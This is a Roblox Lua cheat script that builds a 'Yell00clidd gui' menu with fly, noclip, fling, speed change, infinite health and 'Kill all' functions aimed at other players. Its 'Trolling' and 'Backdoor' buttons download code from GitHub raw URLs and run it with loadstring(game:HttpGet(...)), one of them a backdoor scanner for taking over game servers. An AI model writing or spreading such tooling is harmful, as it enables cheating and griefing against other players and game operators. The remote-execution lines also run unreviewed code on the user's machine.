local UIS = game:GetService("UserInputService")
local RS = game:GetService("RunService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local lighting = game:GetService("Lighting")
local cam = workspace.CurrentCamera
local Web = "https://github.com/YellowYotu/YellowExploids"


print(Web)


-- === Установка или обновление Skybox
local function applySky()
	local skyId = "rbxassetid://112058487231941"
	local sky = lighting:FindFirstChildOfClass("Sky")
	if not sky then
		sky = Instance.new("Sky")
		sky.Name = "YellowSky"
		sky.Parent = lighting
	end
	sky.SkyboxBk = skyId
	sky.SkyboxDn = skyId
	sky.SkyboxFt = skyId
	sky.SkyboxLf = skyId
	sky.SkyboxRt = skyId
	sky.SkyboxUp = skyId
	print("✅ Local skybox applied.")
end

applySky()

-- === GUI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "Yell00clidd gui"
gui.ResetOnSpawn = false

local openButton = Instance.new("TextButton", gui)
openButton.Size = UDim2.new(0, 100, 0, 30)
openButton.Position = UDim2.new(1, -110, 0, 10)
openButton.BackgroundColor3 = Color3.new(0, 0, 0)
openButton.TextColor3 = Color3.fromRGB(0, 255, 0)
openButton.Font = Enum.Font.Code
openButton.TextScaled = true
openButton.Text = "Open GUI"
openButton.Visible = false

local mainFrame = Instance.new("Frame", gui)
mainFrame.Size = UDim2.new(0, 700, 0, 400)
mainFrame.Position = UDim2.new(0.5, -350, 0.5, -200)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Instance.new("UICorner", mainFrame)

-- Top panel
local soonFrame = Instance.new("Frame", mainFrame)
soonFrame.Size = UDim2.new(0, 400, 0, 130)
soonFrame.Position = UDim2.new(0, 20, 0, 20)
soonFrame.BackgroundColor3 = Color3.fromRGB(130, 0, 0)
Instance.new("UICorner", soonFrame)
Instance.new("UIStroke", soonFrame).Color = Color3.new(1, 1, 1)




local versionMain = Instance.new("TextLabel", mainFrame)
versionMain.Size = UDim2.new(0, 200, 0, 30)
versionMain.Position = UDim2.new(1, -210, 0, 20)
versionMain.BackgroundTransparency = 1
versionMain.Text = "Yell00clidd gui version 2.2.2"
versionMain.TextColor3 = Color3.new(1, 1, 1)
versionMain.Font = Enum.Font.Arcade
versionMain.TextScaled = true

-- Close / Exit Buttons
local closeButton = Instance.new("TextButton", mainFrame)
closeButton.Size = UDim2.new(0, 50, 0, 30)
closeButton.Position = UDim2.new(1, -60, 0, 60)
closeButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
closeButton.Text = "Close"
closeButton.TextColor3 = Color3.new(1, 1, 1)
closeButton.Font = Enum.Font.SourceSansBold
closeButton.TextScaled = true
Instance.new("UICorner", closeButton)

local exitButton = Instance.new("TextButton", mainFrame)
exitButton.Size = UDim2.new(0, 50, 0, 30)
exitButton.Position = UDim2.new(1, -60, 0, 100)
exitButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
exitButton.Text = "Exit"
exitButton.TextColor3 = Color3.new(1, 1, 1)
exitButton.Font = Enum.Font.SourceSansBold
exitButton.TextScaled = true
Instance.new("UICorner", exitButton)

closeButton.MouseButton1Click:Connect(function()
	mainFrame.Visible = false
	openButton.Visible = true
end)

openButton.MouseButton1Click:Connect(function()
	mainFrame.Visible = true
	openButton.Visible = false
end)

exitButton.MouseButton1Click:Connect(function()
	gui:Destroy()
end)

-- Bottom panel
local bottomFrame = Instance.new("Frame", mainFrame)
bottomFrame.Size = UDim2.new(0, 660, 0, 200)
bottomFrame.Position = UDim2.new(0, 20, 0, 170)
bottomFrame.BackgroundColor3 = Color3.fromRGB(130, 0, 0)
Instance.new("UICorner", bottomFrame)
Instance.new("UIStroke", bottomFrame).Color = Color3.new(1, 1, 1)

local function createButton(text, posX,posY)
	local b = Instance.new("TextButton", bottomFrame)
	b.Size = UDim2.new(0, 100, 0, 40)
	b.Position = UDim2.new(0, posX, 0, posY)
	b.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
	b.Text = text
	b.TextColor3 = Color3.new(1, 1, 1)
	b.Font = Enum.Font.SourceSansBold
	b.TextScaled = true
	Instance.new("UICorner", b)
	Instance.new("UIStroke", b).Color = Color3.new(1, 1, 1)
	return b
end
local function createBox(text, posX,posY)
	local d = Instance.new("TextBox", bottomFrame)
	d.Size = UDim2.new(0, 100, 0, 40)
	d.Position = UDim2.new(0, posX, 0, posY)
	d.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
	d.Text = text
	d.TextColor3 = Color3.new(1, 1, 1)
	d.Font = Enum.Font.SourceSansBold
	d.TextScaled = true
	Instance.new("UICorner", d)
	Instance.new("UIStroke", d).Color = Color3.new(1, 1, 1)
	return d
end
local function createautouser(text, posX,posY)
	local s = Instance.new("TextBox", bottomFrame)
	s.Size = UDim2.new(0, 50, 0, 20)
	s.Position = UDim2.new(0, posX, 0, posY)
	s.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
	s.Text = text
	s.TextColor3 = Color3.new(0.1, 0.1, 0,1)
	s.Font = Enum.Font.SourceSansBold
	s.TextScaled = true
	Instance.new("UICorner", s)
	return s
end
-- create buttons
local flyButton = createButton("Fly", 10,10)
local noclipButton = createButton("Noclip", 120,10)
local flingButton = createButton("Fling", 230,10)
local imageSkyButton = createButton("Image Sky", 340,10)
local trollingButton = createButton("Trolling", 450,10)
local backdoorButton = createButton("Backdoor", 560,10)
local speedbox = createBox("Enter Speed", 120,65)
speedbox.PlaceholderText = "Enter WalkSpeed"
local speedbutton = createButton("Change Speed", 10,65)
local BlackHole = createButton("BlackHole",230, 65)
local KillAll = createButton("Kill all",340, 65)
local InfHeal = createButton("Infinite Heal", 450,65)
local user = createBox("EnterUser",450, -100)
local userauto = createautouser("Mouse Hover To Auto Enter",450, -45)
userauto.MouseEnter:Connect(function()
	user.Text = player.Name
end)

-- Fly
local flying = false
local flyConn = nil
local vertical = 0
local keys = {W=false,A=false,S=false,D=false}
local function computeDir()
	local dir = Vector3.zero
	if keys.W then dir += Vector3.new(0,0,-1) end
	if keys.S then dir += Vector3.new(0,0,1) end
	if keys.A then dir += Vector3.new(-1,0,0) end
	if keys.D then dir += Vector3.new(1,0,0) end
	return dir.Magnitude > 0 and dir.Unit or Vector3.zero
end
UIS.InputBegan:Connect(function(i,g)
	if g then return end
	local k = i.KeyCode
	if k==Enum.KeyCode.W then keys.W=true end
	if k==Enum.KeyCode.S then keys.S=true end
	if k==Enum.KeyCode.A then keys.A=true end
	if k==Enum.KeyCode.D then keys.D=true end
	if k==Enum.KeyCode.Space then vertical = 1 end
	if k==Enum.KeyCode.LeftShift then vertical = -1 end
end)
UIS.InputEnded:Connect(function(i)
	local k = i.KeyCode
	if k==Enum.KeyCode.W then keys.W=false end
	if k==Enum.KeyCode.S then keys.S=false end
	if k==Enum.KeyCode.A then keys.A=false end
	if k==Enum.KeyCode.D then keys.D=false end
	if k==Enum.KeyCode.Space or k==Enum.KeyCode.LeftShift then vertical=0 end
end)
local function startFly()
	if flying then return end
	flying = true
	local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	local bv = Instance.new("BodyVelocity", hrp)
	local speed = 2000
	bv.Name = "FlyVelocity"
	bv.MaxForce = Vector3.new(speed,speed,speed)*1e5
	bv.Velocity = Vector3.zero
	local bg = Instance.new("BodyGyro", hrp)
	bg.Name = "FlyGyro"
	bg.MaxTorque = Vector3.new(speed,speed,speed)*1e5
	bg.CFrame = hrp.CFrame
	flyConn = RS.RenderStepped:Connect(function()
		local move = computeDir()*50 + Vector3.new(0, vertical*50, 0)
		bv.Velocity = cam.CFrame:VectorToWorldSpace(move)
		bg.CFrame = cam.CFrame
	end)
end
local function stopFly()
	flying = false
	if flyConn then flyConn:Disconnect() flyConn=nil end
	local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	for _,v in pairs(hrp:GetChildren()) do
		if v:IsA("BodyGyro") or v:IsA("BodyVelocity") then v:Destroy() end
	end
end
flyButton.MouseButton1Click:Connect(function()
	if flying then stopFly() else startFly() end
end)

-- Noclip
local noclip = false
local changedParts = {}
noclipButton.MouseButton1Click:Connect(function()
	local char = player.Character
	noclip = not noclip
	if noclip then
		changedParts = {}
		for _,p in pairs(workspace:GetDescendants()) do
			if p:IsA("BasePart") and p.CanCollide and not (char and p:IsDescendantOf(char)) then
				p.CanCollide = false
				table.insert(changedParts, p)
			end
		end
		for _,p in pairs(char:GetDescendants()) do
			if p:IsA("BasePart") and p.CanCollide then
				p.CanCollide = false
				table.insert(changedParts, p)
			end
		end
		startFly()
	else
		for _,p in pairs(changedParts) do
			if p and p:IsA("BasePart") then p.CanCollide = true end
		end
		changedParts = {}
		stopFly()
	end
end)

-- Image Sky
imageSkyButton.MouseButton1Click:Connect(applySky)

-- Fling
local flingActive = false
local flingPart = nil
local flingConnection = nil

local function startFling()
	if flingActive then return end
	flingActive = true

	local char = player.Character
	if not char then return end
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	flingPart = Instance.new("Part")
	flingPart.Size = Vector3.new(2, 2, 2)
	flingPart.Transparency = 0
	flingPart.Anchored = false
	flingPart.CanCollide = false
	flingPart.Position = hrp.Position + Vector3.new(0, 3, 0)
	flingPart.Parent = workspace

	local bav = Instance.new("BodyAngularVelocity")
	bav.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
	bav.AngularVelocity = Vector3.new(50, 50, 50)
	bav.Parent = flingPart

	local bv = Instance.new("BodyVelocity")
	bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
	bv.Velocity = Vector3.new(0, 50, 0)
	bv.Parent = flingPart

	flingConnection = RS.RenderStepped:Connect(function()
		if flingPart and hrp then
			flingPart.CFrame = hrp.CFrame * CFrame.new(0, 3, 0)
		end
	end)
end

local function stopFling()
	flingActive = false
	if flingConnection then
		flingConnection:Disconnect()
		flingConnection = nil
	end
	if flingPart then
		flingPart:Destroy()
		flingPart = nil
	end
end

flingButton.MouseButton1Click:Connect(function()
	if flingActive then
		stopFling()
	else
		startFling()
	end
end)


-- inf health button script
local function InfinityHealth()
	local char = player.Character or player.CharacterAdded:Wait()
	if char then
		local hum = char:FindFirstChild("Humanoid")
		if hum then
			hum.MaxHealth = math.huge
			hum.Health = math.huge
		end
	end
end
InfHeal.MouseButton1Click:Connect(InfinityHealth)


--kill all button script
local function KILLall()
	for _, v in pairs(workspace:GetChildren()) do
		if v:IsA("Model") and v:FindFirstChild("Humanoid") then
			v.Humanoid.Health = 0
		end
	end
end
KillAll.MouseButton1Click:Connect(KILLall)


local drag = Instance.new("UIDragDetector", gui.Frame)
-- Trolling button functionality
trollingButton.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/GordonJimenez/GordonJimenez/main/XordonFEHub.md'))()
end)
-- Backdoor button functionality
backdoorButton.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script"))()
end)
